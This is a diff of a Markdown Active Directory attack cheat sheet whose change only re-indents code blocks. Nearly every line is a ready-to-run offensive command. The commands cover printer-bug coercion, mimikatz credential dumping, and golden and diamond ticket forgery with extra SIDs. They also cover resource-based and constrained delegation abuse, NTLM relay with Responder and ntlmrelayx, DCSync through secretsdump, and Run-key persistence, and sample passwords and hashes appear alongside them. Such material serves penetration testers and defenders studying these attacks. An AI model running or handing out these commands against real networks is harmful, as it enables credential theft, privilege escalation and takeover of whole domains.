@@ -198,20 +198,20 @@ mimikatz# sekurlsa::logonpasswords
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 
 1. Verify that remote computer has spooler service running
-```
-ls \\dc01.contoso.local\pipe\spoolss
-```
+	```
+	ls \\dc01.contoso.local\pipe\spoolss
+	```
 
 2. Download spoolsample [here](https://github.com/leechristensen/SpoolSample) and run the following command to authenticate and capture ticket.
-```
-# run this on domain joined computers
-spoolsample.exe dc01.contoso.local ms01.contoso.local
-# or can use this command for linux workstation
-python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128
+	```
+	# run this on domain joined computers
+	spoolsample.exe dc01.contoso.local ms01.contoso.local
+	# or can use this command for linux workstation
+	python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128
 
-# monitor ticket
-Rubeus.exe monitor /interval:5
-```
+	# monitor ticket
+	Rubeus.exe monitor /interval:5
+	```
 
 ### Extract TGT
 Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
@@ -244,17 +244,17 @@ Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrat
 This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property.
 1. Import ADModule
 2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.
-```
-Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
-```
+	```
+	Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
+	```
 3. Get mycomputer$ ntlm hash or aes keys
-```
-mimikatz# sekurlsa::logonpasswords
-```
+	```
+	mimikatz# sekurlsa::logonpasswords
+	```
 4. Apply s4u delegation (TGT+TGS)
-```
-Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
-```
+	```
+	Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
+	```
 
 ## ACLs/ACEs Abuse
 ### Force Change User Password
@@ -376,19 +376,19 @@ This attack made possible since there is no security boundary between domains. H
 | Parent domain EA SID | `S-1-5-21-378720957-2217973887-3501892633-519` |
 
 1. Forge a [Golden Ticket](#golden-ticket) that contains _extra sid_ of the parent domain's Enterprise Admins.
-```
-# windows
-mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
+	```
+	# windows
+	mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
 
-# linux
-ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
-```
+	# linux
+	ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
+	```
 
 2. Use the ticket to perform Pass The Ticket (PTT) and win!. Ensure to use FQDN if you encounter any errors. _Note that if you ran mimikatz command with `/ptt` flag already does the following step. Hence you might want to skip this step_
-```
-export KRB5CCNAME=Administrator.ccache
-secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
-```
+	```
+	export KRB5CCNAME=Administrator.ccache
+	secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
+	```
 
 Above steps could be automated with [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) if you obtain a privileged account (i.e. Domain Admin). _-debug flag is <3_
 ```
@@ -398,19 +398,19 @@ raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashe
 ## Abuse Forest Trust
 ### SID History
 1. Make sure SID History is enabled
-```
-Get-DomainTrust
-```
+	```
+	Get-DomainTrust
+	```
 If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means SID History is enabled
 
 2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000
-```
-mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
-```
+	```
+	mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
+	```
 3. Asktgs with the generated kirbi ticket
-```
-Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
-```
+	```
+	Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
+	```
 
 ### Shadow Principal/PAM Trust
 The users in current forest can be "mapped" to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate _Shadow Principal_
@@ -467,26 +467,26 @@ _Note: This attack will only work if SMB signing if disabled. This can be verify
 
 1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
 2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
-```
-Responder.py -I eth0 -rdvw
-```
+	```
+	Responder.py -I eth0 -rdvw
+	```
 3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
-```
-all://192.168.0.10
-all://192.168.0.11
-```
+	```
+	all://192.168.0.10
+	all://192.168.0.11
+	```
 4. Run `ntlmrelayx.py`
-```
-ntlmrelayx.py -tf targets.txt -smb2support -socks
-```
+	```
+	ntlmrelayx.py -tf targets.txt -smb2support -socks
+	```
 5. Authenticate with any available Impacket scripts through `proxychains` and supply no password
-```
-# PsExec
-proxychains Psexec.py contoso/administrator:''@192.168.0.10
+	```
+	# PsExec
+	proxychains Psexec.py contoso/administrator:''@192.168.0.10
 
-# mssqlclient
-proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
-```
+	# mssqlclient
+	proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
+	```
 
 ### Credential Harvesting
 ### DCSync
@@ -533,48 +533,48 @@ A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) becau
 	ii. Decrypt the TGT with krbtgt aes key
 	iii. Modify ticket PAC and insert _rangeadm_ in the PAC
 	```
-```
-Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
-```
+	```
+	Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
+	```
 2. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
-```
-.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
-```
+	```
+	.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
+	```
 For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
 
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
 
 1. Set the `msDS-AllowedToDelegateTo` attribute of a user _lowpriv_ to give privilege for it to request ticket for _cifs_ service to dc01.
-```
-# AD Module / RSAT
-Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
+	```
+	# AD Module / RSAT
+	Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
 
-# PowerView
-Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
-Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
+	# PowerView
+	Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
+	Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
 
-# Linux
-setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
-```
+	# Linux
+	setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
+	```
 2. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
-```
-# Rubeus
-Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
-Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
+	```
+	# Rubeus
+	Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
+	Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
 
-# Impacket
-getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
-export KRB5CCNAME='administrator.ccache'
-```
+	# Impacket
+	getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
+	export KRB5CCNAME='administrator.ccache'
+	```
 3. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
-```
-# Sysinternal
-PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
+	```
+	# Sysinternal
+	PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
 
-# Impacket
-smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
-```
+	# Impacket
+	smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
+	```
 
 ### Registry Keys
 ### Execute on startup
@@ -586,31 +586,31 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 1. Add a new value to one of the KeyName above 
-```
-reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
-```
+	```
+	reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
+	```
 
 ### krbtgt Constrained Delegation
 1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
-```
-addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
-```
+	```
+	addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
+	```
 2. Set the _msDS-AllowedToDelegateTo_ attribute to `krbtgt/legitcorp`. [setCD.py](https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py) is a script by [@snovvcrash](https://twitter.com/snovvcrash)
-```
-setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
-```
+	```
+	setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
+	```
 3. Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).
-```
-# request service ticket
-getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'
+	```
+	# request service ticket
+	getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'
 
-# export ticket into environment variable
-export KRB5CCNAME='DC01$.ccache'
-```
+	# export ticket into environment variable
+	export KRB5CCNAME='DC01$.ccache'
+	```
 4. Perform DCSync on the domain controller
-```
-secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
-```
+	```
+	secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
+	```
 You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). _CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps_
 
 ## Remote Authentication Between Computers
